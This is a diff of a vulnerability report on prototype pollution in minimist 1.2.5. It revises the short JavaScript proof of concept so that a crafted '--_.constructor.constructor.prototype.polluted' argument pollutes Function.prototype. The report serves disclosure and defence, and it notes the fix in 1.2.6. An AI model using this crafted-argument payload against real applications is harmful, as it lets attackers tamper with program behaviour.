@@ -7,17 +7,18 @@ Package: minimist 1.2.5
 
 ## Report
 
-There is a prototype pollution vulnerability in minimist 1.2.5. Passing
-crafted arguments through `parse()` allows an attacker to pollute
-`Object.prototype` with attacker-controlled properties.
+There is a prototype pollution vulnerability in minimist 1.2.5. A crafted
+argument whose key path walks through the parsed `_` array and the
+`constructor` chain makes `parse()` assign onto a built-in prototype.
 
 PoC:
 
 ```js
 const minimist = require('minimist');
-minimist(['--__proto__.polluted', 'yes']);
-console.log({}.polluted);
+minimist(['--_.constructor.constructor.prototype.polluted', 'yes']);
+console.log((function () {}).polluted);
 ```
 
-Expected effect: `{}` inherits `polluted === "yes"` after parsing the crafted
-argv. Affects versions before the fix published in 1.2.6.
+Expected effect: `Function.prototype` gains `polluted === "yes"` after parsing
+the crafted argv, so every function inherits it. Affects versions before the
+fix published in 1.2.6.
